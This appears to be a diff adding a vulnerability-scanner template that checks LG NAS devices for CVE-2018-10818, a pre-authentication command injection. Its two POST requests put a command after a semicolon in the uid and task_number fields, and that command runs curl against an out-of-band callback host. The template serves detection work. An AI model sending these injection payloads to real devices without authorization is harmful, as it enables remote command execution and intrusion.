@@ -1,0 +1,50 @@
+[info]
+author = "ave"
+description = "验证 LG NAS 设备是否存在预认证远程命令注入漏洞。向 /system/sharedir.php 和 /en/php/usb_sync.php 端点发送包含命令注入载荷的 POST 请求，若目标返回 HTTP 200 响应，则表明漏洞可能存在。"
+id = "POC-AVE-2018-0045"
+name = "LG NAS Devices 预认证远程命令执行 PoC"
+severity = "critical"
+tags = ["ave-2018-0045"]
+vuln_id = [
+    "CVE-2018-10818",
+    "AVE-2018-0045",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/system/sharedir.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "&uid=10; curl http://{{interactsh-url}} -H 'User-Agent: AVE-PoC'"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+Host = "{{Hostname}}"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "POST"
+path = "/en/php/usb_sync.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "&act=sync&task_number=1;curl http://{{interactsh-url}} -H 'User-Agent: AVE-PoC'"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+Host = "{{Hostname}}"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
